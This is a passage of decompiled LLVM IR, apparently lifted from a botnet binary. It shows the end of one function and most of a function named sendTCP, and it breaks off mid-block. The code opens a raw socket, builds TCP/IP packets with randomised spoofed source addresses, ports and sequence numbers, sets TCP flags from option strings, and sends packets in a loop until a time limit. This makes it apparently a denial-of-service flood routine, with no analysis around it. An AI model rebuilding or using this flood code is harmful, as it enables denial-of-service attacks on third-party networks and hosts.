  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 8, 9, 6, 7, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 41, 40, 42, 43, 47, 44, 45, 46, 71, 49, 48, 50, 51, 53, 52, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 66, 68, 69, 70, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_ce44, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_cd1c, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cbf0, { 1, 0 }
  uselistorder label %dec_label_pc_cac8, { 1, 0 }
  uselistorder label %dec_label_pc_ca4c, { 1, 0 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %dec_label_pc_c8f8, { 1, 0 }
  uselistorder label %dec_label_pc_c810, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_ce50 = load i32, i32* @r4, align 4
  %v6_ce50 = load i32, i32* @fp, align 4
  store i32 52824, i32* %stack_var_-4, align 4
  %v2_ce54 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ce54, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ce90 = icmp eq i32 %arg2, 0
  br i1 %v2_ce90, label %dec_label_pc_ce98, label %dec_label_pc_ceb8

dec_label_pc_ce98:                                ; preds = %entry
  %v0_ce98 = call i32 @rand_cmwc()
  %v3_cea0 = mul i32 %v0_ce98, 65536
  store i32 %v3_cea0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cedc

dec_label_pc_ceb8:                                ; preds = %entry
  %v3_cec0 = urem i32 %arg2, 65536
  store i32 %v3_cec0, i32* %r3.global-to-local, align 4
  %v1_cec8 = call i32 @htons(i32 %v3_cec0)
  br label %dec_label_pc_cedc

dec_label_pc_cedc:                                ; preds = %dec_label_pc_ce98, %dec_label_pc_ceb8
  %v2_cee0 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_cee0, i32* %r3.global-to-local, align 4
  %v3_ceec = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_ceec, i32* %r3.global-to-local, align 4
  %v2_cef4 = icmp eq i32 %v3_ceec, 0
  br i1 %v2_cef4, label %dec_label_pc_cf00, label %dec_label_pc_d494

dec_label_pc_cf00:                                ; preds = %dec_label_pc_cedc
  %v2_cf00 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cf24 = call i32 @socket()
  store i32 %v0_cf24, i32* %r3.global-to-local, align 4
  %v2_cf34 = icmp eq i32 %v0_cf24, 0
  br i1 %v2_cf34, label %dec_label_pc_d494, label %dec_label_pc_cf40

dec_label_pc_cf40:                                ; preds = %dec_label_pc_cf00
  store i32 1, i32* %stack_var_-68, align 4
  %v2_cf48 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_cf48, i32* %r3.global-to-local, align 4
  %v6_cf64 = call i32 @__GI_setsockopt(i32 %v0_cf24, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_cf64, i32* %r3.global-to-local, align 4
  %v1_cf6c = icmp slt i32 %v6_cf64, 0
  br i1 %v1_cf6c, label %dec_label_pc_d494, label %dec_label_pc_cf78

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cf40
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_cf7c = icmp eq i32 %arg4, 0
  br i1 %v2_cf7c, label %dec_label_pc_cfa8, label %dec_label_pc_cf90

dec_label_pc_cf90:                                ; preds = %dec_label_pc_cf78
  %v1_cf94 = sub i32 32, %arg4
  store i32 %v1_cf94, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_cfa0 = shl i32 -1, %v1_cf94
  br label %dec_label_pc_cfa8

dec_label_pc_cfa8:                                ; preds = %dec_label_pc_cf78, %dec_label_pc_cf90
  %storemerge10 = phi i32 [ %v1_cfa0, %dec_label_pc_cf90 ], [ 0, %dec_label_pc_cf78 ]
  %v1_cfac = add i32 %arg6, 40
  %v1_cfbc = add i32 %arg6, 46
  %v3_cfc0 = and i32 %v1_cfbc, -4
  %v1_cfc8 = load i32, i32* @sp, align 4
  %v2_cfc8 = sub i32 %v1_cfc8, %v3_cfc0
  %v1_cfd8 = add i32 %v2_cfc8, 11
  %v3_cfdc = and i32 %v1_cfd8, -4
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_cffc = add i32 %v3_cfdc, 20
  store i32 %v1_cffc, i32* %r3.global-to-local, align 4
  %v5_d000 = inttoptr i32 %v1_cffc to i8*
  %v3_d004 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d004, i32* @r4, align 4
  %v1_d00c = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_d00c, i32* %r3.global-to-local, align 4
  %v1_d018 = call i32 @htonl(i32 %v1_d00c)
  store i32 %v1_d018, i32* %r2.global-to-local, align 4
  %v1_d024 = add i32 %arg6, 20
  %v1_d028 = load i32, i32* @sp, align 4
  %v2_d028 = inttoptr i32 %v1_d028 to i32*
  store i32 %v1_d024, i32* %v2_d028, align 4
  %v0_d030 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_d038 = inttoptr i32 %v3_cfdc to i8*
  %v5_d038 = call i32 @makeIPPacket(i8* %v4_d038, i32 %v0_d030, i32 %v1_d018, i32 6)
  %v0_d03c = call i32 @rand_cmwc()
  %v3_d048 = urem i32 %v0_d03c, 65536
  store i32 %v3_d048, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d050 = trunc i32 %v0_d03c to i8
  store i8 %v1_d050, i8* %v5_d000, align 4
  %v0_d054 = load i32, i32* %r3.global-to-local, align 4
  %v3_d054 = sdiv i32 %v0_d054, 256
  store i32 %v3_d054, i32* %r3.global-to-local, align 4
  %v1_d058 = trunc i32 %v3_d054 to i8
  %v2_d058 = load i32, i32* %r2.global-to-local, align 4
  %v3_d058 = add i32 %v2_d058, 1
  %v4_d058 = inttoptr i32 %v3_d058 to i8*
  store i8 %v1_d058, i8* %v4_d058, align 1
  %v0_d05c = call i32 @rand_cmwc()
  %v2_d068 = add i32 %v3_cfdc, 24
  %v3_d068 = inttoptr i32 %v2_d068 to i32*
  store i32 %v0_d05c, i32* %v3_d068, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d074 = add i32 %v3_cfdc, 28
  %v3_d074 = inttoptr i32 %v2_d074 to i32*
  store i32 0, i32* %v3_d074, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d07c = add i32 %v3_cfdc, 32
  %v2_d07c = inttoptr i32 %v1_d07c to i8*
  %v3_d07c = load i8, i8* %v2_d07c, align 4
  %v1_d088 = urem i8 %v3_d07c, 16
  %v1_d08c = or i8 %v1_d088, 80
  store i8 %v1_d08c, i8* %v2_d07c, align 4
  %v3_d09c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d09c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19768.204 to i32), i32* @r1, align 4
  %v3_d0a8 = inttoptr i32 %v3_d09c to i8*
  %v4_d0a8 = call i32 @__GI_strcoll(i8* %v3_d0a8, i32 ptrtoint ([4 x i8]* @global_var_19768.204 to i32))
  store i32 %v4_d0a8, i32* %r3.global-to-local, align 4
  %v2_d0b0 = icmp eq i32 %v4_d0a8, 0
  br i1 %v2_d0b0, label %dec_label_pc_d0b8, label %dec_label_pc_d10c

dec_label_pc_d0b8:                                ; preds = %dec_label_pc_cfa8
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d0bc = add i32 %v3_cfdc, 33
  %v2_d0bc = inttoptr i32 %v1_d0bc to i8*
  %v3_d0bc = load i8, i8* %v2_d0bc, align 1
  %v4_d0bc = zext i8 %v3_d0bc to i32
  %v1_d0c0 = or i32 %v4_d0bc, 2
  store i32 %v1_d0c0, i32* %r3.global-to-local, align 4
  %v1_d0c4 = trunc i32 %v1_d0c0 to i8
  store i8 %v1_d0c4, i8* %v2_d0bc, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d0cc = load i8, i8* %v2_d0bc, align 1
  %v4_d0cc = zext i8 %v3_d0cc to i32
  %v1_d0d0 = or i32 %v4_d0cc, 4
  store i32 %v1_d0d0, i32* %r3.global-to-local, align 4
  %v1_d0d4 = trunc i32 %v1_d0d0 to i8
  store i8 %v1_d0d4, i8* %v2_d0bc, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d0dc = load i8, i8* %v2_d0bc, align 1
  %v4_d0dc = zext i8 %v3_d0dc to i32
  %v1_d0e0 = or i32 %v4_d0dc, 1
  store i32 %v1_d0e0, i32* %r3.global-to-local, align 4
  %v1_d0e4 = trunc i32 %v1_d0e0 to i8
  store i8 %v1_d0e4, i8* %v2_d0bc, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d0ec = load i8, i8* %v2_d0bc, align 1
  %v4_d0ec = zext i8 %v3_d0ec to i32
  %v1_d0f0 = or i32 %v4_d0ec, 16
  store i32 %v1_d0f0, i32* %r3.global-to-local, align 4
  %v1_d0f4 = trunc i32 %v1_d0f0 to i8
  store i8 %v1_d0f4, i8* %v2_d0bc, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d0fc = load i8, i8* %v2_d0bc, align 1
  %v4_d0fc = zext i8 %v3_d0fc to i32
  %v1_d100 = or i32 %v4_d0fc, 8
  store i32 %v1_d100, i32* %r3.global-to-local, align 4
  %v1_d104 = trunc i32 %v1_d100 to i8
  store i8 %v1_d104, i8* %v2_d0bc, align 1
  br label %dec_label_pc_d234

dec_label_pc_d10c:                                ; preds = %dec_label_pc_cfa8
  %v3_d10c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d10c, i32* %r3.global-to-local, align 4
  store i32 %v3_d10c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1976c.206 to i32), i32* @r1, align 4
  %v2_d118 = call i32 @__GI_strtok(i32 %v3_d10c, i32 ptrtoint (i32* @global_var_1976c.206 to i32))
  store i32 %v2_d118, i32* %r3.global-to-local, align 4
  %v2_d22c20 = icmp eq i32 %v2_d118, 0
  br i1 %v2_d22c20, label %dec_label_pc_d234, label %dec_label_pc_d128.lr.ph

dec_label_pc_d128.lr.ph:                          ; preds = %dec_label_pc_d10c
  %v1_d148 = add i32 %v3_cfdc, 33
  %v2_d148 = inttoptr i32 %v1_d148 to i8*
  br label %dec_label_pc_d128

dec_label_pc_d128:                                ; preds = %dec_label_pc_d128.lr.ph, %dec_label_pc_d214
  %storemerge1421 = phi i32 [ %v2_d118, %dec_label_pc_d128.lr.ph ], [ %v2_d21c, %dec_label_pc_d214 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19770.208 to i32), i32* @r1, align 4
  %v3_d134 = inttoptr i32 %storemerge1421 to i8*
  %v4_d134 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_19770.208 to i32))
  store i32 %v4_d134, i32* %r3.global-to-local, align 4
  %v2_d13c = icmp eq i32 %v4_d134, 0
  br i1 %v2_d13c, label %dec_label_pc_d144, label %dec_label_pc_d158

dec_label_pc_d144:                                ; preds = %dec_label_pc_d128
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d148 = load i8, i8* %v2_d148, align 1
  %v4_d148 = zext i8 %v3_d148 to i32
  %v1_d14c = or i32 %v4_d148, 2
  store i32 %v1_d14c, i32* %r3.global-to-local, align 4
  %v1_d150 = trunc i32 %v1_d14c to i8
  store i8 %v1_d150, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d158:                                ; preds = %dec_label_pc_d128
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19774.210 to i32), i32* @r1, align 4
  %v4_d164 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_19774.210 to i32))
  store i32 %v4_d164, i32* %r3.global-to-local, align 4
  %v2_d16c = icmp eq i32 %v4_d164, 0
  br i1 %v2_d16c, label %dec_label_pc_d174, label %dec_label_pc_d188

dec_label_pc_d174:                                ; preds = %dec_label_pc_d158
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d178 = load i8, i8* %v2_d148, align 1
  %v4_d178 = zext i8 %v3_d178 to i32
  %v1_d17c = or i32 %v4_d178, 4
  store i32 %v1_d17c, i32* %r3.global-to-local, align 4
  %v1_d180 = trunc i32 %v1_d17c to i8
  store i8 %v1_d180, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d188:                                ; preds = %dec_label_pc_d158
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19778.212 to i32), i32* @r1, align 4
  %v4_d194 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_19778.212 to i32))
  store i32 %v4_d194, i32* %r3.global-to-local, align 4
  %v2_d19c = icmp eq i32 %v4_d194, 0
  br i1 %v2_d19c, label %dec_label_pc_d1a4, label %dec_label_pc_d1b8

dec_label_pc_d1a4:                                ; preds = %dec_label_pc_d188
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d1a8 = load i8, i8* %v2_d148, align 1
  %v4_d1a8 = zext i8 %v3_d1a8 to i32
  %v1_d1ac = or i32 %v4_d1a8, 1
  store i32 %v1_d1ac, i32* %r3.global-to-local, align 4
  %v1_d1b0 = trunc i32 %v1_d1ac to i8
  store i8 %v1_d1b0, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d1b8:                                ; preds = %dec_label_pc_d188
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1977c.214 to i32), i32* @r1, align 4
  %v4_d1c4 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_1977c.214 to i32))
  store i32 %v4_d1c4, i32* %r3.global-to-local, align 4
  %v2_d1cc = icmp eq i32 %v4_d1c4, 0
  br i1 %v2_d1cc, label %dec_label_pc_d1d4, label %dec_label_pc_d1e8

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d1b8
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d1d8 = load i8, i8* %v2_d148, align 1
  %v4_d1d8 = zext i8 %v3_d1d8 to i32
  %v1_d1dc = or i32 %v4_d1d8, 16
  store i32 %v1_d1dc, i32* %r3.global-to-local, align 4
  %v1_d1e0 = trunc i32 %v1_d1dc to i8
  store i8 %v1_d1e0, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1b8
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19780.216 to i32), i32* @r1, align 4
  %v4_d1f4 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_19780.216 to i32))
  store i32 %v4_d1f4, i32* %r3.global-to-local, align 4
  %v2_d1fc = icmp eq i32 %v4_d1f4, 0
  br i1 %v2_d1fc, label %dec_label_pc_d204, label %dec_label_pc_d214

dec_label_pc_d204:                                ; preds = %dec_label_pc_d1e8
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d208 = load i8, i8* %v2_d148, align 1
  %v4_d208 = zext i8 %v3_d208 to i32
  %v1_d20c = or i32 %v4_d208, 8
  store i32 %v1_d20c, i32* %r3.global-to-local, align 4
  %v1_d210 = trunc i32 %v1_d20c to i8
  store i8 %v1_d210, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d214:                                ; preds = %dec_label_pc_d1e8, %dec_label_pc_d1d4, %dec_label_pc_d1a4, %dec_label_pc_d174, %dec_label_pc_d144, %dec_label_pc_d204
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1976c.206 to i32), i32* @r1, align 4
  %v2_d21c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1976c.206 to i32))
  store i32 %v2_d21c, i32* %r3.global-to-local, align 4
  %v2_d22c = icmp eq i32 %v2_d21c, 0
  br i1 %v2_d22c, label %dec_label_pc_d234, label %dec_label_pc_d128

dec_label_pc_d234:                                ; preds = %dec_label_pc_d214, %dec_label_pc_d10c, %dec_label_pc_d0b8
  %v0_d234 = call i32 @rand_cmwc()
  %v3_d240 = urem i32 %v0_d234, 65536
  store i32 %v3_d240, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d248 = trunc i32 %v0_d234 to i8
  %v3_d248 = add i32 %v3_cfdc, 34
  %v4_d248 = inttoptr i32 %v3_d248 to i8*
  store i8 %v1_d248, i8* %v4_d248, align 2
  %v0_d24c = load i32, i32* %r3.global-to-local, align 4
  %v3_d24c25 = udiv i32 %v0_d24c, 256
  %v1_d250 = trunc i32 %v3_d24c25 to i8
  %v2_d250 = load i32, i32* %r2.global-to-local, align 4
  %v3_d250 = add i32 %v2_d250, 15
  %v4_d250 = inttoptr i32 %v3_d250 to i8*
  store i8 %v1_d250, i8* %v4_d250, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d25c = add i32 %v3_cfdc, 36
  %v4_d25c = inttoptr i32 %v3_d25c to i8*
  store i8 0, i8* %v4_d25c, align 4
  %v0_d260 = load i32, i32* %r3.global-to-local, align 4
  %v1_d260 = trunc i32 %v0_d260 to i8
  %v2_d260 = load i32, i32* %r2.global-to-local, align 4
  %v3_d260 = add i32 %v2_d260, 17
  %v4_d260 = inttoptr i32 %v3_d260 to i8*
  store i8 %v1_d260, i8* %v4_d260, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d26c = add i32 %v3_cfdc, 38
  %v4_d26c = inttoptr i32 %v3_d26c to i8*
  store i8 0, i8* %v4_d26c, align 2
  %v0_d270 = load i32, i32* %r3.global-to-local, align 4
  %v1_d270 = trunc i32 %v0_d270 to i8
  %v2_d270 = load i32, i32* %r2.global-to-local, align 4
  %v3_d270 = add i32 %v2_d270, 19
  %v4_d270 = inttoptr i32 %v3_d270 to i8*
  store i8 %v1_d270, i8* %v4_d270, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ce90, label %dec_label_pc_d280, label %dec_label_pc_d298

dec_label_pc_d280:                                ; preds = %dec_label_pc_d234
  %v0_d280 = call i32 @rand_cmwc()
  %v3_d288 = mul i32 %v0_d280, 65536
  store i32 %v3_d288, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_d280 to i8
  br label %dec_label_pc_d2b4

dec_label_pc_d298:                                ; preds = %dec_label_pc_d234
  %v3_d2a0 = urem i32 %arg2, 65536
  store i32 %v3_d2a0, i32* %r3.global-to-local, align 4
  %v1_d2a8 = call i32 @htons(i32 %v3_d2a0)
  %extract.t71 = trunc i32 %v1_d2a8 to i8
  br label %dec_label_pc_d2b4

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d280, %dec_label_pc_d298
  %v0_d280.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_d280 ], [ %extract.t71, %dec_label_pc_d298 ]
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v4_d2b8 = sext i8 %v0_d280.sink.off0 to i32
  %v3_d2bc = add i32 %v3_cfdc, 22
  %v4_d2bc = inttoptr i32 %v3_d2bc to i8*
  store i8 %v0_d280.sink.off0, i8* %v4_d2bc, align 2
  %v3_d2c4 = sdiv i32 %v4_d2b8, 256
  %v4_d2c4 = trunc i32 %v3_d2c4 to i8
  store i32 %v3_d2c4, i32* %r3.global-to-local, align 4
  %v4_d2c8 = add i32 %v3_cfdc, 23
  %v5_d2c8 = inttoptr i32 %v4_d2c8 to i8*
  store i8 %v4_d2c4, i8* %v5_d2c8, align 1
  %v5_d2d4 = call i32 @tcpcsum(i32 %v3_cfdc, i32 %v1_cffc, i32 %v1_cffc, i32 %v3_d2c4)
  %sext = mul i32 %v5_d2d4, 16777216
  %v1_d2d8 = sdiv i32 %sext, 16777216
  store i32 %v1_d2d8, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d2e0 = trunc i32 %v1_d2d8 to i8
  store i8 %v1_d2e0, i8* %v4_d25c, align 4
  %v0_d2e4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d2e428 = udiv i32 %v0_d2e4, 256
  %v1_d2e8 = trunc i32 %v3_d2e428 to i8
  %v2_d2e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_d2e8 = add i32 %v2_d2e8, 17
  %v4_d2e8 = inttoptr i32 %v3_d2e8 to i8*
  store i8 %v1_d2e8, i8* %v4_d2e8, align 1
  %v1_d2f8 = or i32 %v3_cfdc, 2
  store i32 %v1_d2f8, i32* %r3.global-to-local, align 4
  %v1_d2fc = inttoptr i32 %v1_d2f8 to i8*
  %v2_d2fc = load i8, i8* %v1_d2fc, align 2
  %v3_d2fc = zext i8 %v2_d2fc to i32
  store i32 %v3_d2fc, i32* %r2.global-to-local, align 4
  %v1_d300 = or i32 %v1_cfd8, 3
  %v2_d300 = inttoptr i32 %v1_d300 to i8*
  %v3_d300 = load i8, i8* %v2_d300, align 1
  %v4_d300 = zext i8 %v3_d300 to i32
  %v4_d304 = mul nuw nsw i32 %v4_d300, 256
  %v5_d304 = or i32 %v4_d304, %v3_d2fc
  store i32 %v5_d304, i32* %r3.global-to-local, align 4
  %v3_d310 = call i32 @csum(i8* %v4_d038, i32 %v5_d304)
  %sext4 = mul i32 %v3_d310, 16777216
  %v1_d314 = sdiv i32 %sext4, 16777216
  store i32 %v1_d314, i32* %r3.global-to-local, align 4
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_d31c = trunc i32 %v1_d314 to i8
  %v3_d31c = add i32 %v3_cfdc, 10
  %v4_d31c = inttoptr i32 %v3_d31c to i8*
  store i8 %v1_d31c, i8* %v4_d31c, align 2
  %v0_d320 = load i32, i32* %r3.global-to-local, align 4
  %v3_d320 = sdiv i32 %v0_d320, 256
  store i32 %v3_d320, i32* %r3.global-to-local, align 4
  %v1_d324 = trunc i32 %v3_d320 to i8
  %v2_d324 = load i32, i32* %r2.global-to-local, align 4
  %v3_d324 = add i32 %v2_d324, 11
  %v4_d324 = inttoptr i32 %v3_d324 to i8*
  store i8 %v1_d324, i8* %v4_d324, align 1
  %v2_d32c = call i32 @__GI_time(i32* null)
  %v2_d338 = add i32 %v2_d32c, %arg3
  store i32 %v2_d338, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d390 = add i32 %v3_cfdc, 12
  %v3_d390 = inttoptr i32 %v2_d390 to i32*
  %v3_d3a8 = add i32 %v3_cfdc, 4
  %v4_d3a8 = inttoptr i32 %v3_d3a8 to i8*
  %v4_d3f0 = add i32 %v3_cfdc, 37
  %v5_d3f0 = inttoptr i32 %v4_d3f0 to i8*
  br label %dec_label_pc_d34c

dec_label_pc_d34c:                                ; preds = %dec_label_pc_d484, %dec_label_pc_d478, %dec_label_pc_d2b4
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_d2b4 ], [ 0, %dec_label_pc_d478 ], [ %v1_d488, %dec_label_pc_d484 ]
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_d354 = load i32, i32* @sp, align 4
  %v2_d354 = inttoptr i32 %v1_d354 to i32*
  store i32 %v2_cf00, i32* %v2_d354, align 4
  %v1_d35c = load i32, i32* @sp, align 4
  %v2_d35c = add i32 %v1_d35c, 4
  %v3_d35c = inttoptr i32 %v2_d35c to i32*
  store i32 16, i32* %v3_d35c, align 4
  %v0_d364 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cfac, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_d370 = inttoptr i32 %v0_d364 to i32*
  %v7_d370 = call i32 @__libc_sendto(i32 %v0_cf24, i32* %v6_d370, i32 %v1_cfac, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_d378 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_d378, i32* %r3.global-to-local, align 4
  %v1_d384 = call i32 @htonl(i32 %v1_d378)
  store i32 %v1_d384, i32* %r2.global-to-local, align 4
  store i32 %v3_cfdc, i32* %r3.global-to-local, align 4
  store i32 %v1_d384, i32* %v3_d390, align 4
  %v0_d394 = call i32 @rand_cmwc()
  %v3_d3a0 = urem i32 %v0_d394, 65536
  store i32 %v3_d3a0, i32* %r3.global-to-local, align 4
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_d3a8 = trunc i32 %v0_d394 to i8
  store i8 %v1_d3a8, i8* %v4_d3a8, align 4
  %v0_d3ac = load i32, i32* %r3.global-to-local, align 4
  %v3_d3ac = sdiv i32 %v0_d3ac, 256
  store i32 %v3_d3ac, i32* %r3.global-to-local, align 4
  %v1_d3b0 = trunc i32 %v3_d3ac to i8
  %v2_d3b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d3b0 = add i32 %v2_d3b0, 5
  %v4_d3b0 = inttoptr i32 %v3_d3b0 to i8*
  store i8 %v1_d3b0, i8* %v4_d3b0, align 1
  %v0_d3b4 = call i32 @rand_cmwc()
  store i32 %v0_d3b4, i32* %r2.global-to-local, align 4
  store i32 %v1_cffc, i32* %r3.global-to-local, align 4
  store i32 %v0_d3b4, i32* %v3_d068, align 4
  %v0_d3c4 = call i32 @rand_cmwc()
  %v3_d3d0 = urem i32 %v0_d3c4, 65536
  store i32 %v3_d3d0, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d3d8 = trunc i32 %v0_d3c4 to i8
  store i8 %v1_d3d8, i8* %v5_d000, align 4
  %v0_d3dc = load i32, i32* %r3.global-to-local, align 4
  %v3_d3dc29 = udiv i32 %v0_d3dc, 256
  %v1_d3e0 = trunc i32 %v3_d3dc29 to i8
  %v2_d3e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d3e0 = add i32 %v2_d3e0, 1
  %v4_d3e0 = inttoptr i32 %v3_d3e0 to i8*
  store i8 %v1_d3e0, i8* %v4_d3e0, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_d25c, align 4
  store i8 0, i8* %v5_d3f0, align 1
  %v5_d3fc = call i32 @tcpcsum(i32 %v3_cfdc, i32 %v1_cffc, i32 %v1_cffc, i32 0)
  %sext5 = mul i32 %v5_d3fc, 16777216
  %v1_d400 = sdiv i32 %sext5, 16777216
  store i32 %v1_d400, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d408 = trunc i32 %v1_d400 to i8
  store i8 %v1_d408, i8* %v4_d25c, align 4
  %v0_d40c = load i32, i32* %r3.global-to-local, align 4
  %v3_d40c30 = udiv i32 %v0_d40c, 256
  %v1_d410 = trunc i32 %v3_d40c30 to i8
  %v2_d410 = load i32, i32* %r2.global-to-local, align 4
  %v3_d410 = add i32 %v2_d410, 17
  %v4_d410 = inttoptr i32 %v3_d410 to i8*
